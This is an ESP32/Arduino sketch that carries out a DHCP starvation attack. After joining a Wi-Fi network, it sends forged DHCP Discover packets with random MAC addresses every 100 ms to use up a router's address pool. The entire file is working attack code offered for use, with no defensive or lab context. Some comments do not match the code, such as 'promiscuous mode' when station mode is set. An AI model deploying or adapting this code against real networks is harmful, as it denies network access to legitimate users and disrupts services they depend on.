#include <WiFi.h>
#include <WiFiUdp.h>

// Configuration
const char* target_ssid = "YOUR_NETWORK_SSID";  // Change to your network
const char* target_bssid = "FF:FF:FF:FF:FF:FF"; // Broadcast MAC
const IPAddress dhcp_server(192, 168, 1, 1);    // DHCP server IP
const IPAddress network(192, 168, 1, 0);        // Network address
const IPAddress netmask(255, 255, 255, 0);       // Netmask

WiFiUDP udp;

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\nStarting DHCP Exhaustion Attack");
  
  // Initialize WiFi in promiscuous mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  // Connect to target network (optional, but helps with packet injection)
  Serial.printf("Connecting to %s\n", target_ssid);
  WiFi.begin(target_ssid);
  
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  
  Serial.println("\nConnected to network");
  Serial.print("IP Address: ");
  Serial.println(WiFi.localIP());
  
  // Initialize UDP
  udp.begin(68); // DHCP client port
}

void loop() {
  static uint32_t lastAttackTime = 0;
  static uint16_t ip_counter = 1; // Start from 192.168.1.1
  
  if (millis() - lastAttackTime > 100) { // Send every 100ms
    lastAttackTime = millis();
    
    // Generate random MAC
    uint8_t mac[6];
    randomMAC(mac);
    
    // Craft DHCP Discover packet
    sendDHCPDiscover(mac, ip_counter);
    
    Serial.printf("Sent DHCP Discover for 192.168.1.%d with MAC %02X:%02X:%02X:%02X:%02X:%02X\n",
                 ip_counter, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    
    ip_counter++;
    if (ip_counter > 254) ip_counter = 1; // Wrap around
  }
}

void randomMAC(uint8_t* mac) {
  mac[0] = 0x02; // Locally administered MAC
  for (int i = 1; i < 6; i++) {
    mac[i] = random(0, 256);
  }
}

void sendDHCPDiscover(uint8_t* mac, uint16_t ip_counter) {
  uint8_t buffer[300];
  int pos = 0;
  
  // DHCP Message Type: Discover
  buffer[pos++] = 0x01;   // BOOTREQUEST
  buffer[pos++] = 0x01;   // Ethernet
  buffer[pos++] = 0x06;   // HW addr len
  buffer[pos++] = 0x00;   // Hops
  
  // Transaction ID (random)
  uint32_t xid = random(0xFFFFFFFF);
  buffer[pos++] = (xid >> 24) & 0xFF;
  buffer[pos++] = (xid >> 16) & 0xFF;
  buffer[pos++] = (xid >> 8) & 0xFF;
  buffer[pos++] = xid & 0xFF;
  
  // Seconds elapsed
  buffer[pos++] = 0x00;
  buffer[pos++] = 0x00;
  
  // Flags (broadcast)
  buffer[pos++] = 0x80;
  buffer[pos++] = 0x00;
  
  // Client IP address (0.0.0.0)
  memset(buffer + pos, 0, 4);
  pos += 4;
  
  // Your IP address (0.0.0.0)
  memset(buffer + pos, 0, 4);
  pos += 4;
  
  // Server IP address (0.0.0.0)
  memset(buffer + pos, 0, 4);
  pos += 4;
  
  // Gateway IP address (0.0.0.0)
  memset(buffer + pos, 0, 4);
  pos += 4;
  
  // Client hardware address
  memcpy(buffer + pos, mac, 6);
  pos += 6;
  
  // Padding
  memset(buffer + pos, 0, 10);
  pos += 10;
  
  // Server name (empty)
  memset(buffer + pos, 0, 64);
  pos += 64;
  
  // Boot file name (empty)
  memset(buffer + pos, 0, 128);
  pos += 128;
  
  // DHCP Magic Cookie
  buffer[pos++] = 0x63;
  buffer[pos++] = 0x82;
  buffer[pos++] = 0x53;
  buffer[pos++] = 0x63;
  
  // DHCP Options
  // Message Type: Discover
  buffer[pos++] = 53;    // Option: DHCP Message Type
  buffer[pos++] = 1;     // Length
  buffer[pos++] = 1;     // DHCP Discover
  
  // Client Identifier
  buffer[pos++] = 61;    // Option: Client Identifier
  buffer[pos++] = 7;     // Length
  buffer[pos++] = 1;     // Type: Ethernet
  memcpy(buffer + pos, mac, 6);
  pos += 6;
  
  // Requested IP (optional)
  buffer[pos++] = 50;    // Option: Requested IP
  buffer[pos++] = 4;     // Length
  buffer[pos++] = 192;   // 192.168.1.x
  buffer[pos++] = 168;
  buffer[pos++] = 1;
  buffer[pos++] = ip_counter;
  
  // Parameter Request List
  buffer[pos++] = 55;    // Option: Parameter Request List
  buffer[pos++] = 4;     // Length
  buffer[pos++] = 1;     // Subnet Mask
  buffer[pos++] = 3;     // Router
  buffer[pos++] = 6;     // DNS
  buffer[pos++] = 15;    // Domain Name
  
  // End Option
  buffer[pos++] = 255;   // End
  
  // Send the packet
  udp.beginPacket(dhcp_server, 67); // DHCP server port
  udp.write(buffer, pos);
  udp.endPacket();
}
